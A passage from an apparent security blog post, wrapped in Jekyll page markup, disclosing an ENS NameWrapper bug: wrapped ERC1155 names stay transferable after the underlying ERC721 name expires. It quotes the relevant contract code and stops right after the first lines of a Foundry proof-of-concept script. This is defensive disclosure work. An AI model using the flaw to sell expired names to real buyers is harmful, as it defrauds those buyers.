<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Bounty: ENS NameWrapper expiry issue" />
<meta property="og:locale" content="en" />
<meta name="description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
<meta property="og:description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
<link rel="canonical" href="http://0.0.0.0:4000/posts/ens-namewrapper-bounty/" />
<meta property="og:url" content="http://0.0.0.0:4000/posts/ens-namewrapper-bounty/" />
<meta property="og:site_name" content="LCFR" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-12-24T19:28:22-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bounty: ENS NameWrapper expiry issue" />
<meta name="twitter:site" content="@lcfr_eth" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-12-24T19:28:22-05:00","datePublished":"2022-12-24T19:28:22-05:00","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Bounty: ENS NameWrapper expiry issue","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/posts/ens-namewrapper-bounty/"},"url":"http://0.0.0.0:4000/posts/ens-namewrapper-bounty/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Bounty: ENS NameWrapper expiry issue | LCFR
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="LCFR">
<meta name="application-name" content="LCFR">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/Paradise_Lost_12.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">LCFR</a>
    <p class="site-subtitle fst-italic mb-0">nobody</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/lcfr-eth"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/lcfr_eth"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['nobody','lcfr.io'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Bounty: ENS NameWrapper expiry issue</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  

  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  




<!-- return -->










<article class="px-1" data-toc="false">
  <header>
    <h1 data-toc-skip>Bounty: ENS NameWrapper expiry issue</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1671928102"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Dec 24, 2022
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/lcfr_eth">LCFR</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1671 words"
>
  <em>9 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  

  <div class="content">
    <p><a href="https://upload.wikimedia.org/assets/img/paradise.jpeg" class="popup img-link  shimmer"><img src="https://upload.wikimedia.org/assets/img/paradise.jpeg" alt="image" loading="lazy"></a></p>

<h5 id="quick-links"><span class="me-2">Quick Links</span><a href="#quick-links" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>
<p><a href="#about-ens-and-ens-subdomains">About ENS and ENS Subdomains</a><br />
<a href="#about-the-ens-namewrapper">About the NameWrapper</a><br />
<a href="#finding-the-bug">Finding the bug</a><br />
<a href="#proof-of-concept">Proof of Concept</a><br />
<a href="#patch">Patch</a><br />
<a href="#reward">Reward</a></p>

<h1 id="about-ens-and-ens-subdomains">About ENS and ENS Subdomains</h1>
<p>Currently <a href="https://docs.ens.domains/">Ethereum Name Service</a> or just ENS for short is an ERC721 NFT collection. A user can mint a token that represents something similar to a domain or username where as its a memorable representation of a users wallet address such as a word, phrase, pattern of text, pattern of digits, emojis, almost anything can be registered as a top level ENS name as the only limitation on the contract is that names must be &gt;= 3 characters in length. ENS names also allow the user to store various TEXT records similar to DNS Text records.</p>

<p>Similar to DNS/Domain names; ENS allows an owner of a name to create “subdomains” of the top level name. ENS subdomains currently at the time of writing are not minted as tradable tokens (ERC721, ERC1155, etc). Meaning that if the owner of coke.eth created drink.coke.eth that name can not be traded to another user by the current “owner” of the subdomain.</p>

<h1 id="about-the-namewrapper">About the NameWrapper</h1>

<p>The <a href="https://github.com/ensdomains/ens-contracts/tree/master/contracts/wrapper">NameWrapper</a> contracts are an ERC1155 “upgrade” for new or existing ERC721 ENS names. The wrapper allows the owner of an ERC721 ENS name to wrap the name into an ERC1155 token. This wrapping comes with added functionality such that subdomains are now minted similarly to the top level name and become tradable/transferable as an ERC1155 token. Allowing users to generate income from subdomain purchases/rentals etc.</p>

<h1 id="finding-the-bug">Finding the bug</h1>

<p>This bug was uncovered while I was implementing subdomain functionality for <a href="https://ens.vision">ENSVision</a> and comparing the new ERC1155fuse expirations with the way I know the previous ERC721 expirations worked.</p>

<p>In the current ENS ERC721 token implementation the transaction will revert if the names expiration is &gt; <em>now</em></p>

<p>To see how that works the three functions that handle token transfers are below.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">safeTransferFrom</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">safeTransferFrom</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">safeTransferFrom</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_data</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">transferFrom</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
    <span class="nf">require</span><span class="p">(</span><span class="nf">_checkOnERC721Received</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">_data</span><span class="p">));</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nf">_isApprovedOrOwner</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">));</span>
    <span class="nf">_transferFrom</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>You can see that all paths from other functions lead to the _transferFrom() function. Lets take a look below:</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">_transferFrom</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="nx">internal</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nf">ownerOf</span><span class="p">(</span><span class="nx">tokenId</span><span class="p">)</span> <span class="o">==</span> <span class="k">from</span><span class="p">);</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">to</span> <span class="o">!=</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>

    <span class="nf">_clearApproval</span><span class="p">(</span><span class="nx">tokenId</span><span class="p">);</span>

    <span class="nx">_ownedTokensCount</span><span class="p">[</span><span class="k">from</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_ownedTokensCount</span><span class="p">[</span><span class="k">from</span><span class="p">].</span><span class="nf">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="nx">_ownedTokensCount</span><span class="p">[</span><span class="nx">to</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_ownedTokensCount</span><span class="p">[</span><span class="nx">to</span><span class="p">].</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="nx">_tokenOwner</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">]</span> <span class="o">=</span> <span class="nx">to</span><span class="p">;</span>

    <span class="nx">emit</span> <span class="nc">Transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">ownerOf</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">expiries</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">now</span><span class="p">);</span> <span class="c1">// Check if name is expired, revert if expired.</span>
    <span class="k">return</span> <span class="k">super</span><span class="p">.</span><span class="nf">ownerOf</span><span class="p">(</span><span class="nx">tokenId</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>When transferFrom or safeTransferFrom is called on a token/name it first calls ownerOf which verifies the tokens expiration is greater than <em>now</em> or it will revert per the require statement.</p>

<p>Knowing this we can keep this in mind while reviewing the ERC1155 nameWrapper contract and compare expiration methodology.</p>

<p>Check the transfer methods of the ERC1155 namewrapper below. For brevity I wont include the batchTransfer functions.</p>

<p>The code snippets below can be found in this <a href="https://github.com/ensdomains/ens-contracts/tree/deployment/testnets/contracts/wrapper">github repo</a></p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nf">safeTransferFrom</span><span class="p">(</span>
        <span class="nx">address</span> <span class="k">from</span><span class="p">,</span>
        <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span>
        <span class="nx">uint256</span> <span class="nx">id</span><span class="p">,</span>
        <span class="nx">uint256</span> <span class="nx">amount</span><span class="p">,</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span>
    <span class="p">)</span> <span class="kr">public</span> <span class="nx">virtual</span> <span class="nx">override</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">to</span> <span class="o">!=</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="dl">"</span><span class="s2">ERC1155: transfer to the zero address</span><span class="dl">"</span><span class="p">);</span>
        <span class="nf">require</span><span class="p">(</span>
            <span class="k">from</span> <span class="o">==</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">||</span> <span class="nf">isApprovedForAll</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">),</span>
            <span class="dl">"</span><span class="s2">ERC1155: caller is not owner nor approved</span><span class="dl">"</span>
        <span class="p">);</span>

        <span class="nf">_transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">amount</span><span class="p">,</span> <span class="nx">data</span><span class="p">);</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>You can see that the safeTransferFrom call calls the _transfer() function below:</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">_transfer</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">amount</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span> <span class="p">)</span> <span class="nx">internal</span> <span class="p">{</span>

        <span class="p">(</span><span class="nx">address</span> <span class="nx">oldOwner</span><span class="p">,</span> <span class="nx">uint32</span> <span class="nx">fuses</span><span class="p">,</span> <span class="nx">uint64</span> <span class="nx">expiry</span><span class="p">)</span> <span class="o">=</span> <span class="nf">getData</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span> <span class="c1">// get owner, fuses, expiration of given tokenId</span>

        <span class="k">if </span><span class="p">(</span><span class="nx">oldOwner</span> <span class="o">==</span> <span class="nx">to</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nf">_canTransfer</span><span class="p">(</span><span class="nx">fuses</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">revert</span> <span class="nc">OperationProhibited</span><span class="p">(</span><span class="nf">bytes32</span><span class="p">(</span><span class="nx">id</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="nf">require</span><span class="p">(</span>
            <span class="nx">amount</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">oldOwner</span> <span class="o">==</span> <span class="k">from</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">ERC1155: insufficient balance for transfer</span><span class="dl">"</span>
        <span class="p">);</span>

        <span class="c1">// set owner, fuses, expiration of given tokenId</span>
        <span class="c1">// if you recall getData sets the fuses = 0 if now &gt; expiration. </span>
        <span class="nf">_setData</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">fuses</span><span class="p">,</span> <span class="nx">expiry</span><span class="p">);</span>

        <span class="nx">emit</span> <span class="nc">TransferSingle</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>

        <span class="nf">_doSafeTransferAcceptanceCheck</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">amount</span><span class="p">,</span> <span class="nx">data</span><span class="p">);</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>The _transfer() function will call getData() to retrieve info about a specific tokenId such as owner, fuses, expiration instead of the ownerOf() function from the ERC721 token.</p>

<p>Checking the getData() and setData() functions below will give us all we need to know:</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nf">getData</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span>
        <span class="kr">public</span>
        <span class="nx">view</span>
        <span class="nf">returns </span><span class="p">(</span>
            <span class="nx">address</span> <span class="nx">owner</span><span class="p">,</span>
            <span class="nx">uint32</span> <span class="nx">fuses</span><span class="p">,</span>
            <span class="nx">uint64</span> <span class="nx">expiry</span>
        <span class="p">)</span>
    <span class="p">{</span>
        <span class="nx">uint256</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">_tokens</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">];</span>
        <span class="nx">owner</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nf">uint160</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
        <span class="nx">expiry</span> <span class="o">=</span> <span class="nf">uint64</span><span class="p">(</span><span class="nx">t</span> <span class="o">&gt;&gt;</span> <span class="mi">192</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">&gt;</span> <span class="nx">expiry</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">fuses</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// reset fuses to 0 here if expiration &gt; now and return that value as the fuse value.</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">fuses</span> <span class="o">=</span> <span class="nf">uint32</span><span class="p">(</span><span class="nx">t</span> <span class="o">&gt;&gt;</span> <span class="mi">160</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The getData() function will check if the blocktimestamp is &gt; the tokens expiration. If it is then it will simply set the fuses to 0 effectively resetting them to default value and continue execution.</p>

<p>setData() will take the input variables and set the tokenId owner, fuses, expiration with the given parameters. 
Meaning if a wrapped ERC1155 token “expires” the fuses are simply reset to 0 and nothing else.</p>

<p>An astute reader may notice that unlike the ERC721 implementation the ERC1155 implementation has no locking of the token when its expired. Meaning that wrapped ERC1155 tokens can continue to be transferred/sold post-expiration.</p>

<p>An example would be that the ERC721 john.eth owned by 0xABC is wrapped as an ERC1155 john.eth owned by 0xABC. When the ERC721 john.eth expires and 0xABC no longer owns it and thus can no longer transfer it, they could still transfer/sell the ERC1155 john.eth token until some one remints/buys the ERC721 token then mints a <em>new</em> ERC1155 john.eth. The previous ERC1155 john.eth token would finally be burned and any purchaser of that ERC1155 token would be rugged.</p>

<p>When dealing with any <em>wrapped</em> tokens one needs to think of the underlying asset as well as the <em>new</em> asset functionality.</p>

<p>I reported this <a href="https://discuss.ens.domains/t/namewrapper-updates-including-testnet-deployment-addresses/14505/9?u=lcfr.eth">bug</a> to ENS in October 2022 after the first code4arena audit completed but prior to the deployment to mainnet.</p>

<h1 id="proof-of-concept">Proof of Concept</h1>

<p>Below is a foundry script to demonstrate the vulnerability. It will first register an ENS name, wrap the name on the nameWrapper contract and then fastfoward the blocktime to &gt; expiration using the foundry cheatcode warp(). While the names ERC721 token is expired or in grace it can not be transferred or sold. How ever the ERC1155 wrapped token which corresponds to the unwrapped ERC721 name can still be transferred or sold on market places.</p>

<p>Eventually when the base ERC721 name is re-registered and wrapped the previous ERC1155 token would be burned/rugged from the user who potentially purchased it on secondary.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

